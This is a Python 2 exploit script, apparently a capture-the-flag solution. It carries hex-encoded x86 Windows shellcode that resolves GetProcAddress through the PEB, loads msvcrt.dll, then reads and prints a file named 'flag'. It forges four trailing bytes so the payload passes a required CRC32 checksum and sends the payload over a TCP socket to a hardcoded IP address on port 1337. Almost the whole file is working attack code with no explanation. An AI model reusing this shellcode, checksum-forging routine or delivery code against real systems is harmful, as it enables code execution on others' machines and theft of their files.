import socket
import time
from struct import*


def bit_not(n):
    binary = bin(n)
    binary = binary[2:]
    while len(binary) < 32:
        binary = "0" + binary

    not_binary = ""
    for _ in binary:
        if '1' == _:
            not_binary += '0'
        else:
            not_binary += '1'

    return int(not_binary, 2)
    # return (1 << n.bit_length()) - 1 - n

def reverse_bits(num, bit_size=32): 
  
    # convert number into binary representation 
    # output will be like bin(10) = '0b10101' 
    binary = bin(num) 
    # print(binary)

    # skip first two characters of binary 
    # representation string and reverse 
    # remaining string and then append zeros 
    # after it. binary[-1:1:-1]  --> start 
    # from last character and reverse it until 
    # second last character from left 
    reverse = binary[-1:1:-1] 
    reverse = reverse + (bit_size - len(reverse))*'0'

    # converts reversed binary string into integer 
    reversed_num = int(reverse,2) 

    # print(bin(reversed_num))
    return reversed_num

def calc_checksum(shellcode):
    hex_bytes = shellcode.decode("hex")

    checksum = 0xffffffff

    for b in hex_bytes:
        number = ord(b)
        reversed_number = reverse_bits(number)

        for j in range(8):
            if (reversed_number ^ checksum) & 0x80000000 == 0:
                checksum <<= 1
                checksum &= 0xFFFFFFFF
            else:        
                checksum <<= 1
                checksum &= 0xFFFFFFFF
                checksum ^= 0x04C11DB7

            reversed_number <<= 1
            reversed_number &= 0xFFFFFFFF

    checksum = bit_not(checksum)
    checksum = reverse_bits(checksum)

    return hex(checksum)


def fix_shellcode(shellcode, should="11000111100100111100100110010000"):
    hex_bytes = shellcode.decode("hex")

    checksum = 0xffffffff

    for b in hex_bytes:
        number = ord(b)
        reversed_number = reverse_bits(number)

        for j in range(8):
            if (reversed_number ^ checksum) & 0x80000000 == 0:
                checksum <<= 1
                checksum &= 0xFFFFFFFF
            else:        
                checksum <<= 1
                checksum &= 0xFFFFFFFF
                checksum ^= 0x04C11DB7

            reversed_number <<= 1
            reversed_number &= 0xFFFFFFFF

    c_1 = ""
    for i in range(8):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_1 += '0'
            else: c_1 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_1 += '1'
            else: c_1 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_1 = int(c_1, 2)
    c_1 = reverse_bits(c_1, 8)
    c_1 = chr(c_1)
    
    c_2 = ""
    for i in range(8,16):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_2 += '0'
            else: c_2 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_2 += '1'
            else: c_2 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_2 = int(c_2, 2)
    c_2 = reverse_bits(c_2, 8)
    c_2 = chr(c_2)

    c_3 = ""
    for i in range(16,24):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_3 += '0'
            else: c_3 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_3 += '1'
            else: c_3 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_3 = int(c_3, 2)
    c_3 = reverse_bits(c_3, 8)
    c_3 = chr(c_3)

    c_4 = ""
    for i in range(24,32):
        if should[i] == '1':
            if checksum & 0x80000000 != 0: c_4 += '0'
            else: c_4 += '1'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
            checksum ^= 0x04C11DB7
        else:
            if checksum & 0x80000000 != 0: c_4 += '1'
            else: c_4 += '0'

            checksum <<= 1
            checksum &= 0xFFFFFFFF
    c_4 = int(c_4, 2)
    c_4 = reverse_bits(c_4, 8)
    c_4 = chr(c_4)


    hex_bytes += c_1 + c_2 + c_3 + c_4

    # checksum = bit_not(checksum)
    # checksum = reverse_bits(checksum)

    # target = 0xf00df00d
    # target = reverse_bits(target)
    # target = bit_not(target)
    # print(hex(target))



    return "".join(["{:02x}".format(ord(b)) for b in hex_bytes])


if __name__=='__main__':
    shellcode = "31C9648B41308B400C8B7014AD96AD8B58108B533C01DA8B527801DA8B722001DE31C941AD01D881384765745075F4817804726F634175EB8178086464726575E28B722401DE668B0C4E498B721C01DE8B148E01DA31F689D631C9516861727941684C696272684C6F616489E15153FFD231C966B96C6C516872742E64686D73766389E151FFD031FF89C731D252B26E5268666F706589E1515731D289F2FFD231C95168666C616789E131DBB3725389E35351FFD089C331C9B16451686672656189E1515731D289F2FFD289E183EC205331DB43C1E3065331DB435351FFD089CB31D266BA746652687072696E89E15157FFD683EB0253FFD031D252686578697489E15157FFD6FFD031D266BA746652687072696E89E35357FFD651FFD031D252686578697489E15157FFD6FFD031D252686578697489E15157FFD6FFD031C0"

    # print(fix_shellcode(shellcode))
    # print(calc_checksum(fix_shellcode(shellcode)))

    host = "18.196.92.84"
    port = 1337

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    time.sleep(1)    
    buffer = s.recv(1024)
    print(buffer)
    
    s.send(fix_shellcode(shellcode) + "\n")
    
    time.sleep(1)
    buffer = s.recv(1024)
    print(buffer)
    time.sleep(1)
    buffer = s.recv(1024)
    print(buffer)

    
        

